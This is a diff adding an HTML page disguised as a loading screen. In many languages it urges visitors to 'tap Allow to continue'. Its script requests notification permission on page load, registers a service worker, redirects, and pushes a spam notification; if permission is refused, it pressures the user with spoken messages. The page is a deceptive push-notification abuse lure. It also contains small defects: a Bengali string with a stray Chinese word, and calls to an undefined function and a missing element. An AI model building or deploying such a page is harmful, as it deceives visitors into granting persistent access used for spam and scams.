@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title id="title">## Please tap the Allow button to continue ##</title>
+    <link rel="stylesheet" href="style.css" as="style" />
+    <style>
+      /* Basic setup to center the content */
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Helvetica, Arial, sans-serif;
+      }
+
+      .wrapper {
+        display: flex;
+        flex-direction: column;
+        justify-content: center; /* Center vertically */
+        align-items: center; /* Center horizontally */
+        min-height: 100%;
+        text-align: center;
+        padding: 20px;
+        box-sizing: border-box;
+      }
+
+      .text {
+        margin-top: 20px; /* Add some space above the text */
+        font-size: 1.1rem;
+        color: #555;
+      }
+
+      /* --- Version 7: Dotted Bar (10 DOTS) --- */
+      .progress-bar-v7 {
+        text-align: center;
+        font-size: 3rem; /* Made dots a bit larger */
+        font-weight: bold;
+        color: #8e44ad;
+        /* The width is determined by the number of dots and spacing */
+        width: 100%;
+        max-width: 300px; /* Prevents it from getting too wide on large screens */
+      }
+
+      .progress-bar-v7 .dot {
+        animation: dot-loader 1.8s infinite ease-in-out both;
+        display: inline-block;
+        margin: 0 2px; /* Adds a little space between dots */
+      }
+
+      /* Animation delays for each dot to create the wave effect */
+      .progress-bar-v7 .dot1 {
+        animation-delay: -0.8s;
+      }
+      .progress-bar-v7 .dot2 {
+        animation-delay: -0.64s;
+      }
+      .progress-bar-v7 .dot3 {
+        animation-delay: -0.48s;
+      }
+      .progress-bar-v7 .dot4 {
+        animation-delay: -0.32s;
+      }
+      .progress-bar-v7 .dot5 {
+        animation-delay: -0.16s;
+      }
+      .progress-bar-v7 .dot6 {
+        animation-delay: 0s;
+      }
+      .progress-bar-v7 .dot7 {
+        animation-delay: 0.16s;
+      }
+      .progress-bar-v7 .dot8 {
+        animation-delay: 0.32s;
+      }
+      .progress-bar-v7 .dot9 {
+        animation-delay: 0.48s;
+      }
+      .progress-bar-v7 .dot10 {
+        animation-delay: 0.64s;
+      }
+
+      @keyframes dot-loader {
+        0%,
+        80%,
+        100% {
+          transform: scale(0);
+        }
+        40% {
+          transform: scale(1);
+        }
+      }
+    </style>
+  </head>
+  <body class="en style1">
+    <div class="wrapper">
+      <div class="progress-bar-v7">
+        <span class="dot dot1">.</span>
+        <span class="dot dot2">.</span>
+        <span class="dot dot3">.</span>
+        <span class="dot dot4">.</span>
+        <span class="dot dot5">.</span>
+        <span class="dot dot6">.</span>
+        <span class="dot dot7">.</span>
+        <span class="dot dot8">.</span>
+        <span class="dot dot9">.</span>
+        <span class="dot dot10">.</span>
+      </div>
+      <div id="text1" class="text">Please tap the Allow button to continue</div>
+    </div>
+
+    <script>
+      // This script will run when the page loads to set the language.
+      document.addEventListener("DOMContentLoaded", function () {
+        // Object containing all the translations.
+        const translations = {
+          en: "Please tap the Allow button to continue",
+          es: "Por favor, toque el botón Permitir para continuar",
+          fr: "Veuillez appuyer sur le bouton Autoriser pour continuer",
+          de: "Bitte tippen Sie auf die Schaltfläche Zulassen, um fortzufahren",
+          it: "Tocca il pulsante Consenti per continuare",
+          pt: "Toque no botão Permitir para continuar",
+          nl: "Tik op de knop Toestaan om door te gaan",
+          ru: "Пожалуйста, нажмите кнопку Разрешить, чтобы продолжить",
+          ja: "続行するには、「許可」ボタンをタップしてください",
+          ko: "계속하려면 허용 버튼을 탭하세요",
+          zh: "请点击“允许”按钮继续",
+          ar: "يرجى النقر على زر السماح للمتابعة",
+          hi: "जारी रखने के लिए कृपया अनुमति दें बटन पर टैप करें",
+          bn: "অনুগ্রহ করে继续 করতে অনুমতি দিন বোতামে আলতো চাপুন",
+          tr: "Devam etmek için lütfen İzin Ver düğmesine dokunun",
+          pl: "Naciśnij przycisk Zezwalaj, aby kontynuować",
+          sv: "Tryck på knappen Tillåt för att fortsätta",
+          vi: "Vui lòng nhấn vào nút Cho phép để tiếp tục",
+          th: "โปรดแตะปุ่มอนุญาตเพื่อดำเนินการต่อ",
+          id: "Silakan ketuk tombol Izinkan untuk melanjutkan",
+        };
+
+        // Find the text element and the title element.
+        const textElement = document.getElementById("text1");
+        const titleElement = document.getElementById("title");
+
+        // Get the browser's language (e.g., "en-US", "fr-FR").
+        const browserLang = navigator.language || navigator.userLanguage;
+
+        // Get the primary language code (e.g., "en", "fr").
+        const langCode = browserLang.split("-")[0];
+
+        // Check if a translation for the language exists, otherwise default to English.
+        const translatedText = translations[langCode] || translations["en"];
+
+        // Update the text on the page and the page title.
+        if (textElement) {
+          textElement.textContent = translatedText;
+        }
+        if (titleElement) {
+          titleElement.textContent = translatedText;
+        }
+      });
+    </script>
+    <script async data-cfasync="false">
+      (function () {
+        Notification.requestPermission().then((e) => {
+          if (e !== "granted") {
+            document.querySelector(".text").innerText =
+              "Clear permissions and try again";
+            speechSynthesis.speak(
+              new SpeechSynthesisUtterance(`Clear permissions and try again`)
+            );
+            return robotify();
+          }
+
+          if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/sw.js");
+          }
+          document.querySelector(".text").innerText =
+            "You may now continue to your content";
+          document.querySelector("p").style.color = "green";
+          speechSynthesis.speak(
+            new SpeechSynthesisUtterance(`You may now continue to your content`)
+          );
+
+          setTimeout(() => {
+            location.href = "/tetapux/ak/pcb.html";
+          }, 1000);
+
+          new Notification("Make phone happy.", {
+            body: "MAKE YOUR PHONE HAPPY AND ALLOW NOTIFICATIONS NOW.",
+            icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
+          });
+        });
+      })();
+    </script>
+  </body>
+</html>
